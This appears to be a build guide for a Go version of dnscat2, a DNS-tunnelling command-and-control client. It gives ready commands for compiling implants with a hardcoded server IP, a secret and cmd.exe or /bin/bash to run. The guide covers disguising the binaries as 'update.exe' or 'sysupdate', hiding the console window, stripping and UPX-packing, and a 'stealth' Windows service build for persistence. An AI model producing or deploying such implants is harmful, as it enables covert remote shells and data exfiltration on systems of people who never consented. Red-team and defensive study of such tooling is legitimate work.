# Build Standalone Payloads

## Hardcoded Configuration

```bash
go build -ldflags="-s -w \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=YOUR_SECRET_HEX \
  -X main.DefaultExec=cmd.exe" \
  -o payload.exe ./cmd/dnscat/
```

## Available Variables

| Variable                 | Description                         | Default        |
| ------------------------ | ----------------------------------- | -------------- |
| `main.DefaultServer`     | DNS server IP                       | ""             |
| `main.DefaultSecret`     | Pre-shared secret (hex)             | ""             |
| `main.DefaultExec`       | Command to execute                  | ""             |
| `main.DefaultDomain`     | Domain name                         | ""             |
| `main.DefaultDelay`      | Packet delay (ms)                   | "1000"         |
| `main.DefaultPort`       | DNS port                            | "53"           |
| `main.DefaultDNSTypes`   | DNS record types                    | "TXT,CNAME,MX" |
| `main.DisableEncryption` | Disable encryption ("true"/"false") | "false"        |

## Examples

**Windows (hidden window):**

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.100 \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e \
  -X main.DefaultExec=cmd.exe" \
  -o update.exe ./cmd/dnscat/
```

**Linux:**

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w \
  -X main.DefaultServer=10.0.0.5 \
  -X main.DefaultSecret=90652b5ca36bf255cbce1cf7dbab8c6e \
  -X main.DefaultExec=/bin/bash" \
  -o sysupdate ./cmd/dnscat/
```

**Command session (no shell):**

```bash
go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=abc123..." \
  -o payload.exe ./cmd/dnscat/
```

## Multi-Platform Build

```bash
# Windows x64
GOOS=windows GOARCH=amd64 go build -ldflags="..." -o payload-x64.exe ./cmd/dnscat/

# Windows x86
GOOS=windows GOARCH=386 go build -ldflags="..." -o payload-x86.exe ./cmd/dnscat/

# Linux x64
GOOS=linux GOARCH=amd64 go build -ldflags="..." -o payload-linux ./cmd/dnscat/

# macOS ARM64 (M1/M2)
GOOS=darwin GOARCH=arm64 go build -ldflags="..." -o payload-mac ./cmd/dnscat/
```

## Additional Optimization

**Strip symbols:**

```bash
-ldflags="-s -w"  # Already reduces size significantly
```

**UPX compression:**

```bash
upx --best payload.exe  # Further compress (optional)
```

**Hide console (Windows):**

```bash
-ldflags="-H windowsgui"  # No console window
```

## Windows Service Build

The `cmd/dnscat-service` module enables running dnscat2 as a native Windows service.

**Basic service build:**

```powershell
# Build without hardcoded config (requires registry configuration)
go build -o dnscat2-service.exe ./cmd/dnscat-service

# Build with hardcoded config (no registry needed)
go build -ldflags="-X main.DefaultDnsServer=192.168.1.2 -X main.DefaultSecret=mysecret" -o dnscat2-service.exe ./cmd/dnscat-service
```

**Stealth service build (recommended):**

```powershell
# Single-file, hardcoded config, stripped symbols
go build -ldflags="-s -w -X main.DefaultDnsServer=10.0.0.1 -X main.DefaultSecret=abc123 -X main.DefaultExecCommand=cmd.exe" -o dnscat2-service.exe ./cmd/dnscat-service
```

**Service build variables:**

| Variable | Description | Example |
|----------|-------------|---------|
| `main.DefaultDomain` | Domain to tunnel through | `example.com` |
| `main.DefaultDnsServer` | DNS server IP | `192.168.1.2` |
| `main.DefaultDnsPort` | DNS port | `"53"` |
| `main.DefaultDnsTypes` | DNS record types | `"TXT,CNAME,MX"` |
| `main.DefaultSecret` | Pre-shared secret | `"mysecret"` |
| `main.DefaultExecCommand` | Command to execute | `"cmd.exe"` |
| `main.DefaultDelay` | Packet delay in ms | `"1000"` |
| `main.DefaultMaxRetransmit` | Max retransmits | `"20"` |
| `main.DefaultNoEncryption` | Disable encryption | `"true"` |
| `main.DefaultPacketTrace` | Enable packet trace | `"true"` |


## Notes

- Command-line args override hardcoded defaults
- Payload runs standalone without arguments
- All variables are optional
- Empty string = use original default behavior
